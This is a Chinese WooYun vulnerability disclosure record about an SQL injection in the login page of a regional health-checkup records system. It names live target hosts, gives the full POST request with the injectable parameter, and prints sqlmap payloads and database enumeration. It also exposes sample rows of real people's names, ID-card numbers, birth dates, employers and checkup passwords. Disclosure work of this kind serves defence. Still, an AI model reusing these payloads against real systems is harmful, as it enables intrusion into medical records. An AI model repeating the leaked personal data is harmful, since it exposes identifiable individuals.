{"id": 46161, "wybug_id": "wooyun-2014-085700", "wybug_title": "某通用健康体检档案管理系统SQL注入（可影响大量社会公民信息）", "wybug_corp": "中卫信软件", "wybug_author": "小饼仔", "wybug_date": "2014-12-03 12:43", "wybug_open_date": "2015-03-03 12:44", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-12-11：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-02-01：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-11：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-02-21：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-03-03：\t细节向公众公开  简要描述： 泄露姓名、年龄、公司、身份证号、地址等信息，还可以查体检报告哦~ 详细说明：  公司：中卫信软件地址：http://www.chiscdc.com/简介：中卫信软件成立以来以“传递科技，控制疾病”为使命，致力于中国公共卫生事业信息化建设，在社会各界的大力支持下，通过全体员工的不懈的努力，在公共卫生行业信息建设方面取得了良好的业绩。公司开发的相关软件产品覆盖江苏省公共卫生领域近70%的市场份额，用户数达1500多家，成为江苏省公共卫生领域信息化建设的领先企业。    联系方式，不让复制就截图了：\n\n存在注入的系统为健康体检系列\n\n查找到的部分案例有：\n上海市化工职业病防治院体检查询系统\thttp://www.shhgzf.com:8280/index.asp泰州市健康体检查询系统\thttp://221.230.140.60:8080/index.asp宿迁市健康体检档案管理系统\thttp://218.93.201.187:8888/index.asp镇江市健康体检档案管理系统\thttp://221.230.8.231:8081/南通市健康体检档案管理系统\thttp://222.184.250.2:8001/吴江市健康体检档案管理系统\thttp://58.211.131.154:84/宜兴市体检档案管理系统\thttp://58.221.214.82:82/无锡市健康体检档案管理系统\thttp://58.214.247.138:8088/indextjgr.asp宜兴职业健康档案管理系统\thttp://yianjkong.vicp.cc:8081/index.asp苏州市健康体检档案管理系统\thttp://www.szcdc.cn/wstjnew/index.asp\n影响数据量粗略估计145W + \n\n以 宜兴市体检档案管理系统\thttp://58.221.214.82:82/为例\n\n登入处存在POST注入，注入参数为sfpasspost请求\nPOST /grcx/login.asp HTTP/1.1Host: 58.221.214.82:82Proxy-Connection: keep-aliveContent-Length: 35Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://58.221.214.82:82User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.104 Safari/537.36Content-Type: application/x-www-form-urlencodedDNT: 1Referer: http://58.221.214.82:82/Accept-Encoding: gzip,deflateAccept-Language: zh-CN,zh;q=0.8,en-US;q=0.6,en;q=0.4Cookie: ASPSESSIONIDCQCDQBRS=JFFLHIGDDBNNAIOCIDFFBNMORA-Ver: 2.7.1RA-Sid: 65E7C870-20141014-044958-a23ba1-b78bccsfname=1111&sfcode=1111&sfpass=1111\nsqlmap\nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: sfpass    Type: error-based    Title: Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause    Payload: sfname=1111&sfcode=1111&sfpass=-7036' OR 4914=CONVERT(INT,(SELECT CHAR(113)+CHAR(103)+CHAR(113)+CHAR(111)+CHAR(113)+(SELECT (CASE WHEN (4914=4914) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(99)+CHAR(101)+CHAR(113))) AND 'WdqG'='WdqG    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: sfname=1111&sfcode=1111&sfpass=1111'; WAITFOR DELAY '0:0:10'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase OR time-based blind (heavy query)    Payload: sfname=1111&sfcode=1111&sfpass=-2213' OR 9263=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND 'Xtqw'='Xtqw---web server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0back-end DBMS: Microsoft SQL Server 2008current database:    'rd_system'available databases [9]:[*] KSDemo[*] lis2002[*] master[*] model[*] msdb[*] rd_system[*] ReportServer[*] ReportServerTempDB[*] tempdbDatabase: rd_system[606 tables]+--------------------------------+| CW_INVMTB                      || CW_INVSUB                      || GBZ188UP                       || N_TS_MENU                      || N_TS_OPERATELOG                || N_TS_PROVERROR                 || N_TS_PROVLOG                   || NoChargeItm                    || TB_APU                         || TB_APUCLS                      || TB_APUCTG                      || TB_APUSTA                      || TB_APU_MTNLOG                  || TB_ARE                         || TB_BASE_DETAIL                 || TB_BASE_MASTER                 || TB_BHKITMNJCOD                 || TB_CHK_ACHIEVE                 || TB_CHK_APUCON                  || TB_CHK_APUCONSML               || TB_CHK_APUCONTRACEHG           || TB_CHK_APUCONYZYG              || TB_CHK_APUHPLCLCPMS            |省略···\n表dbo.TD_TJ_BHK存放个人信息和体检报告查询用户名和密码数据举例\n99537\t321283199402266000\t19\t205074\t男\t02 26 1994 12:00AM\t朱国龙\t07 31 2013  8:06AM\t32013007399\tNULL\t江苏苏中电池科技发展有限公司99538\t320623195709163000\t56\t554875\t男\t09 16 1957 12:00AM\t张圣宏\t07 31 2013  8:07AM\t42013000100\tNULL\t长沙镇长沙医院99539\t320623197807313000\t35\t31472\t男\t07 31 1978 12:00AM\t季丛泉\t07 31 2013  8:07AM\t32013007400\tNULL\t江苏禾本生化有限公司9954\t320623198305178000\t27\t473852\t男\t05 17 1983 12:00AM\t王雨斌\t03 15 2010  8:40AM\t32010001054\tNULL\t江苏苏中电池科技股份有限公司99540\t320623198710319000\t26\t161671\t男\t10 31 1987 12:00AM\t卜荣荣\t07 31 2013  8:08AM\t42013000101\tNULL\t南通科赛尔机械有限公司99541\t320623195509081000\t58\t556287\t男\t09  8 1955 12:00AM\t袁清\t07 31 2013  8:09AM\t42013000102\tNULL\t掘港镇九总医院\n字段对应关系：姓名   编号    密码EMPNAM BHKCOD  PSW举例：刘泰云 32011002544 547041   漏洞证明：  查询体检报告：\n\n\n\n   修复方案：  ~   版权声明：转载请注明来源 小饼仔@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：16  确认时间：2014-12-08 12:12 厂商回复： CNVD确认并复现所述情况，已经由CNVD通过公开联系渠道电话和邮件向软件生产厂商——中卫信公司通报。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-12-03 13:32 |    \t\t小饼仔 \t\t\t( 普通白帽子  |\t\t\t        Rank:363 漏洞数:41        | 不告诉你)\t\t \n  @疯狗 这个为啥走小厂商？    \n     2014-12-09 15:47 |    \t\t小饼仔 \t\t\t( 普通白帽子  |\t\t\t        Rank:363 漏洞数:41        | 不告诉你)\t\t \n  @Finger @xsser @zeracker 求解，这个为什么走小厂商？    \n     2015-03-03 14:01 |    \t\tgoubuli \t\t\t( 普通白帽子  |\t\t\t        Rank:324 漏洞数:30        )\t\t \n  @小饼仔  都上首页了，肯定不是小厂商。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 16, "Ranks": null}